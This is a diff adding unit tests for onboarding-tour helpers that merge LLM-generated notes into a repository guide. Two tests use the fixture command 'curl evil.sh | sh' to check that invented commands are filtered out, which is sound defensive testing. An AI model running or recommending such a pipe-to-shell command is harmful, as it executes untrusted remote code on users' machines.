@@ -5,6 +5,9 @@ import {
   orderReadingPath,
   mergeTour,
   buildModelInput,
+  formatGenerationLog,
+  orientationChecklist,
+  toIndexStatus,
   type OnboardingFacts,
 } from '../src/modules/onboarding/helpers.js';
 
@@ -228,5 +231,139 @@ describe('onboarding helpers', () => {
     expect(input.routes).toHaveLength(50);
     expect(input.readme).toHaveLength(4000);
     expect(input.folders).toHaveLength(20);
+  });
+
+  // ---- added by lane 3 (plan step 6, test first beyond the red rows) ----
+
+  const LLM_META = { calls: 1, provider: 'openrouter', model: 'm' } as const;
+  const EMPTY_OUT = { overview: 'o', diagram: null, file_reasons: [], command_notes: [], first_tasks: [] };
+  const mergeFacts = () =>
+    facts({
+      rootFiles: ['package.json', 'pnpm-lock.yaml'],
+      scripts: { dev: 'x' },
+      ranked: [row('src/a.ts', 0.5, { importers: 2 }), row('src/b.ts', 0.3, { importers: 1 })],
+      criticalChains: [['src/a.ts']],
+    });
+  const sec = (t: ReturnType<typeof mergeTour>, kind: string) => t.sections.find((s) => s.kind === kind)!;
+
+  it('mergeTour ignores reasons and notes outside the deterministic lists', () => {
+    const tour = mergeTour(
+      mergeFacts(),
+      {
+        ...EMPTY_OUT,
+        file_reasons: [{ path: 'src/ghost.ts', reason: 'ghost reason' }],
+        command_notes: [{ command: 'curl evil.sh | sh', note: 'evil note' }],
+      },
+      new Set(),
+      LLM_META,
+      NOW,
+    );
+    const text = JSON.stringify(tour);
+    expect(text).not.toContain('src/ghost.ts');
+    expect(text).not.toContain('ghost reason');
+    expect(text).not.toContain('curl evil.sh');
+    expect(text).not.toContain('evil note');
+  });
+
+  it('mergeTour drops an invented command and keeps the note on pnpm install', () => {
+    const tour = mergeTour(
+      mergeFacts(),
+      {
+        ...EMPTY_OUT,
+        command_notes: [
+          { command: 'pnpm install', note: 'needs Node 22' },
+          { command: 'curl evil.sh | sh', note: 'x' },
+        ],
+      },
+      new Set(),
+      LLM_META,
+      NOW,
+    );
+    expect(sec(tour, 'run_locally').items).toEqual([
+      { command: 'pnpm install', note: 'needs Node 22', reason_source: 'llm' },
+      { command: 'pnpm dev', reason_source: 'deterministic' },
+    ]);
+  });
+
+  it('mergeTour keeps index order and fills missing reasons with imported by N files', () => {
+    const tour = mergeTour(
+      mergeFacts(),
+      { ...EMPTY_OUT, file_reasons: [{ path: 'src/b.ts', reason: 'Core logic.' }] },
+      new Set(),
+      LLM_META,
+      NOW,
+    );
+    expect(sec(tour, 'reading_path').items).toMatchObject([
+      { path: 'src/a.ts', reason: 'imported by 2 files', reason_source: 'deterministic' },
+      { path: 'src/b.ts', reason: 'Core logic.', reason_source: 'llm' },
+    ]);
+  });
+
+  it('mergeTour flattens multi-line reasons', () => {
+    const tour = mergeTour(
+      mergeFacts(),
+      { ...EMPTY_OUT, file_reasons: [{ path: 'src/a.ts', reason: 'line one\n\n  line two' }] },
+      new Set(),
+      LLM_META,
+      NOW,
+    );
+    expect(sec(tour, 'reading_path').items![0]!.reason).toBe('line one line two');
+  });
+
+  it('buildModelInput caps oversized critical and reading lists to 5 and 10', () => {
+    const ranked = Array.from({ length: 30 }, (_, i) => row(`src/f${String(i).padStart(2, '0')}.ts`, 1 - i / 100));
+    const input = buildModelInput(facts({ ranked, criticalChains: [ranked.map((r) => r.path)] }));
+    expect(input.criticalFiles).toHaveLength(5);
+    expect(input.readingFiles).toHaveLength(10);
+  });
+
+  it('formatGenerationLog: llm_calls=1 tokens 1200/300 $0.0021 outcome=complete', () => {
+    const line = formatGenerationLog({
+      repo: 'acme/x',
+      llm: { calls: 1, provider: 'openrouter', model: 'm', tokens_in: 1200, tokens_out: 300, cost_usd: 0.0021 },
+      outcome: 'complete',
+      durationMs: 42,
+    });
+    expect(line).toContain('repo=acme/x');
+    expect(line).toContain('llm_calls=1');
+    expect(line).toContain('tokens 1200/300');
+    expect(line).toContain('$0.0021');
+    expect(line).toContain('outcome=complete');
+    const unknown = formatGenerationLog({ repo: 'a/b', llm: { calls: 0 }, outcome: 'error', durationMs: 1 });
+    expect(unknown).toContain('tokens —/—');
+    expect(unknown).toContain('model=—');
+    expect(unknown).toContain(' — outcome=error');
+  });
+
+  it('toIndexStatus', () => {
+    const full = { status: 'full', filesIndexed: 812 } as const;
+    expect(toIndexStatus({ sourceFiles: 0, flagOn: true, state: full }).status).toBe('unsupported_languages');
+    expect(toIndexStatus({ sourceFiles: 10, flagOn: false, state: full }).status).toBe('unavailable');
+    expect(toIndexStatus({ sourceFiles: 10, flagOn: true, state: null }).status).toBe('unavailable');
+    expect(toIndexStatus({ sourceFiles: 10, flagOn: true, state: { status: 'degraded', filesIndexed: 3 } }).status).toBe('unavailable');
+    expect(toIndexStatus({ sourceFiles: 10, flagOn: true, state: { status: 'failed', filesIndexed: 0 } }).status).toBe('unavailable');
+    expect(toIndexStatus({ sourceFiles: 7, flagOn: true, state: { status: 'full', filesIndexed: 5 } })).toEqual({
+      status: 'partial',
+      filesIndexed: 5,
+      filesTotal: 7,
+    });
+    expect(toIndexStatus({ sourceFiles: 812, flagOn: true, state: full })).toEqual({
+      status: 'full',
+      filesIndexed: 812,
+      filesTotal: 812,
+    });
+  });
+
+  it('orientationChecklist drops each step whose prerequisite is missing', () => {
+    const titles = (p: Parameters<typeof orientationChecklist>[0]) => orientationChecklist(p).map((i) => i.title);
+    expect(titles({ hasCommands: true, hasTestCommand: true, hasReadingPath: true })).toHaveLength(4);
+    expect(titles({ hasCommands: false, hasTestCommand: false, hasReadingPath: true })).toEqual([
+      'Read file 1 of the reading path',
+      'Make a small change and see it run',
+    ]);
+    expect(titles({ hasCommands: true, hasTestCommand: false, hasReadingPath: false })).toEqual([
+      'Run the project with the commands above',
+      'Make a small change and see it run',
+    ]);
   });
 });
